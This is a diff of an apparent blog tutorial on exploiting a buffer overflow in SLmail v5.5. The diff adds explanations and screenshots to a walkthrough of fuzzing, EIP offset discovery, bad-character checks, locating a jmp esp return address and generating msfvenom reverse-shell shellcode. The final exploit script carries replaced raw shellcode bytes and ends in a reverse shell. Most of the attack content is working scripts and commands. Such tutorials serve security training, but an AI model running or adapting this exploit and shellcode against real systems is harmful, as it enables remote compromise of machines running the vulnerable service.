@@ -161,7 +161,7 @@ In order to show a practicle buffer overflow example, SLmail v5.5 will be used. 
 
 1. Crash the application by sending 'A's.
 
-fuzzing.py
+Script fuzzing.py
 ```python
 #!/usr/bin/python
 import time, struct, sys
@@ -210,18 +210,24 @@ for string in buff:
         sys.exit()
 ```
 
-Then, calculate how many bytes are needed to make the software crash (NUM_BYTES):
-[]
+After the script execution, EIP value is overwrite with 41414141 which is the ASCII value of AAAA:
+
+Calculate how many bytes are needed to make the software crash. In this example, 2900 bytes:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/fuzzing2.png)
+
 
 2. Identify with 4 bytes overwrite EIP
-Create a unique pattern using pattner_create.rb:
+
+In order to know exactly which 4 bytes overwrite EIP, a unique pattern is created using pattner_create.rb:
 ```python
 pattern_create.rb -l NUM_BYTES
 ```
-[]
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/pattern_create.png)
 
 
-indentify_eip.py
+Using the unique patter in the script indentify_eip.py
 ```python
 #!/usr/bin/python
 import time, struct, sys
@@ -251,16 +257,20 @@ except:
 
 ```
 
+After the execution, the EIP will be overwrite with a unique pattern:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/identify_eip.png)
 
 Calculate the exact bytes which overwrite EIP using pattern_offset.rb:
 ```
 pattern_offset.rb -q EIP_VALUE
 ```
-[]
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/pattern_offset.png)
 
 
-3. Check if we have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's
-check_eip.py
+3. Check if you have full control of the EIP by sending 'A'*offset + 'B'*4 + 'C's
+By sending the script check_eip.py, it is possible to know if you have control of the EIP. If so, EIP should have 4 'B's.
 ```python
 #!/usr/bin/python
 
@@ -291,11 +301,21 @@ except:
    sys.exit()
 ```
 
+EIP value is 42424242 which is the ASCII value of BBBB:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/check_eip1.png)
+
+In memory, you can see how it has been overwrited with 'A', the EIP with 4 'B' and after with 'C':
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/check_eip2.png)
+
+
+
 4. Find space for the shellcode
 
 
 5. Discover bad characters by looking which of them are not correctly printed (Remember to include always \x00)
-badchars.py
+The script badchars.py checks which characters cannot be sent due to the software would crash.
 ```python
 #!/usr/bin/python
 
@@ -347,16 +367,39 @@ except:
 
 ```
 
+After sending the script, if you look into the memory you can see how the characters from 0x01 to 0x09 are displayed correctly. However, after 0x09 all the following characters are broken:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0a.png)
+
+If you add 0x0A as a badchar and send the script again, form 0x01 to 0x0C are displayed correctly. So 0x0A is a badchar:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0a2.png)
+
+Looking to the memory again, you can see how the character 0x0D is not displayed. It should be added as a badchar:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchar_0d.png)
+
+After adding the badchars 0x00, 0x0A and 0x0D, you can see how all the characters are correctly displayed ending with the 0xFF.
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/badchars_end.png)
+
+So. all characters from 0x01 to 0xFF, except 0x00, 0x0A and 0x0D, are correctly represented.
+
 6. Find the return address
 Calculate op code of jmp esp using nasm_shell.rb:
 ```
 nasm_shell.rb jmp esp
 ```
 
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/op_code.png)
+
+
 Search for a dll which has the values "rebase", "safeSEH", "ASLR" and "NXCompact" set to false:
 ```
 !mona modules
 ```
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/mona_modules.png)
 
 Look for a "jmp esp" inside the dll:
 ```
@@ -364,9 +407,15 @@ Look for a "jmp esp" inside the dll:
 
 Select any pointer and copy its address
 
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/mona_find.png)
+
+
 7. Create a shell
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f py -b "BADCHARS"
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/msfvenom.png)
+
 
 8. Exploit
 ```python
@@ -384,35 +433,34 @@ jmpesp = '\x8f\x35\x4a\x5f'
 #NOP Sled
 nops = '\x90'*16
 
-#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.132.7 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT
 buf =  ""
-buf += "\xdb\xdc\xd9\x74\x24\xf4\xbf\xf7\x90\xbb\x27\x5d\x2b"
-buf += "\xc9\xb1\x52\x31\x7d\x17\x83\xc5\x04\x03\x8a\x83\x59"
-buf += "\xd2\x88\x4c\x1f\x1d\x70\x8d\x40\x97\x95\xbc\x40\xc3"
-buf += "\xde\xef\x70\x87\xb2\x03\xfa\xc5\x26\x97\x8e\xc1\x49"
-buf += "\x10\x24\x34\x64\xa1\x15\x04\xe7\x21\x64\x59\xc7\x18"
-buf += "\xa7\xac\x06\x5c\xda\x5d\x5a\x35\x90\xf0\x4a\x32\xec"
-buf += "\xc8\xe1\x08\xe0\x48\x16\xd8\x03\x78\x89\x52\x5a\x5a"
-buf += "\x28\xb6\xd6\xd3\x32\xdb\xd3\xaa\xc9\x2f\xaf\x2c\x1b"
-buf += "\x7e\x50\x82\x62\x4e\xa3\xda\xa3\x69\x5c\xa9\xdd\x89"
-buf += "\xe1\xaa\x1a\xf3\x3d\x3e\xb8\x53\xb5\x98\x64\x65\x1a"
-buf += "\x7e\xef\x69\xd7\xf4\xb7\x6d\xe6\xd9\xcc\x8a\x63\xdc"
-buf += "\x02\x1b\x37\xfb\x86\x47\xe3\x62\x9f\x2d\x42\x9a\xff"
-buf += "\x8d\x3b\x3e\x74\x23\x2f\x33\xd7\x2c\x9c\x7e\xe7\xac"
-buf += "\x8a\x09\x94\x9e\x15\xa2\x32\x93\xde\x6c\xc5\xd4\xf4"
-buf += "\xc9\x59\x2b\xf7\x29\x70\xe8\xa3\x79\xea\xd9\xcb\x11"
-buf += "\xea\xe6\x19\xb5\xba\x48\xf2\x76\x6a\x29\xa2\x1e\x60"
-buf += "\xa6\x9d\x3f\x8b\x6c\xb6\xaa\x76\xe7\x79\x82\x3e\x77"
-buf += "\x11\xd1\xbe\x66\xbe\x5c\x58\xe2\x2e\x09\xf3\x9b\xd7"
-buf += "\x10\x8f\x3a\x17\x8f\xea\x7d\x93\x3c\x0b\x33\x54\x48"
-buf += "\x1f\xa4\x94\x07\x7d\x63\xaa\xbd\xe9\xef\x39\x5a\xe9"
-buf += "\x66\x22\xf5\xbe\x2f\x94\x0c\x2a\xc2\x8f\xa6\x48\x1f"
-buf += "\x49\x80\xc8\xc4\xaa\x0f\xd1\x89\x97\x2b\xc1\x57\x17"
-buf += "\x70\xb5\x07\x4e\x2e\x63\xee\x38\x80\xdd\xb8\x97\x4a"
-buf += "\x89\x3d\xd4\x4c\xcf\x41\x31\x3b\x2f\xf3\xec\x7a\x50"
-buf += "\x3c\x79\x8b\x29\x20\x19\x74\xe0\xe0\x29\x3f\xa8\x41"
-buf += "\xa2\xe6\x39\xd0\xaf\x18\x94\x17\xd6\x9a\x1c\xe8\x2d"
-buf += "\x82\x55\xed\x6a\x04\x86\x9f\xe3\xe1\xa8\x0c\x03\x20"
+buf += "\xbe\x49\xdc\x42\x73\xdb\xd5\xd9\x74\x24\xf4\x5a\x29"
+buf += "\xc9\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\x3b\xd2\xa0"
+buf += "\x86\x47\x02\xa6\x69\xb7\xd3\xc7\xe0\x52\xe2\xc7\x97"
+buf += "\x17\x55\xf8\xdc\x75\x5a\x73\xb0\x6d\xe9\xf1\x1d\x82"
+buf += "\x5a\xbf\x7b\xad\x5b\xec\xb8\xac\xdf\xef\xec\x0e\xe1"
+buf += "\x3f\xe1\x4f\x26\x5d\x08\x1d\xff\x29\xbf\xb1\x74\x67"
+buf += "\x7c\x3a\xc6\x69\x04\xdf\x9f\x88\x25\x4e\xab\xd2\xe5"
+buf += "\x71\x78\x6f\xac\x69\x9d\x4a\x66\x02\x55\x20\x79\xc2"
+buf += "\xa7\xc9\xd6\x2b\x08\x38\x26\x6c\xaf\xa3\x5d\x84\xd3"
+buf += "\x5e\x66\x53\xa9\x84\xe3\x47\x09\x4e\x53\xa3\xab\x83"
+buf += "\x02\x20\xa7\x68\x40\x6e\xa4\x6f\x85\x05\xd0\xe4\x28"
+buf += "\xc9\x50\xbe\x0e\xcd\x39\x64\x2e\x54\xe4\xcb\x4f\x86"
+buf += "\x47\xb3\xf5\xcd\x6a\xa0\x87\x8c\xe2\x05\xaa\x2e\xf3"
+buf += "\x01\xbd\x5d\xc1\x8e\x15\xc9\x69\x46\xb0\x0e\x8d\x7d"
+buf += "\x04\x80\x70\x7e\x75\x89\xb6\x2a\x25\xa1\x1f\x53\xae"
+buf += "\x31\x9f\x86\x61\x61\x0f\x79\xc2\xd1\xef\x29\xaa\x3b"
+buf += "\xe0\x16\xca\x44\x2a\x3f\x61\xbf\xbd\x80\xde\xf9\xd0"
+buf += "\x69\x1d\x05\x3a\x36\xa8\xe3\x56\xd6\xfc\xbc\xce\x4f"
+buf += "\xa5\x36\x6e\x8f\x73\x33\xb0\x1b\x70\xc4\x7f\xec\xfd"
+buf += "\xd6\xe8\x1c\x48\x84\xbf\x23\x66\xa0\x5c\xb1\xed\x30"
+buf += "\x2a\xaa\xb9\x67\x7b\x1c\xb0\xed\x91\x07\x6a\x13\x68"
+buf += "\xd1\x55\x97\xb7\x22\x5b\x16\x35\x1e\x7f\x08\x83\x9f"
+buf += "\x3b\x7c\x5b\xf6\x95\x2a\x1d\xa0\x57\x84\xf7\x1f\x3e"
+buf += "\x40\x81\x53\x81\x16\x8e\xb9\x77\xf6\x3f\x14\xce\x09"
+buf += "\x8f\xf0\xc6\x72\xed\x60\x28\xa9\xb5\x91\x63\xf3\x9c"
+buf += "\x39\x2a\x66\x9d\x27\xcd\x5d\xe2\x51\x4e\x57\x9b\xa5"
+buf += "\x4e\x12\x9e\xe2\xc8\xcf\xd2\x7b\xbd\xef\x41\x7b\x94"
 
 overflow = achars + jmpesp + nops + buf
 
@@ -438,3 +486,7 @@ except:
    sys.exit()
 
 ```
+
+After executing the exploit, reverse shell is obtained:
+
+![](https://raw.githubusercontent.com/trelis24/trelis24.github.io/master/img/2019-27-02-Basic-Buffer-Overflow/exploit.png)
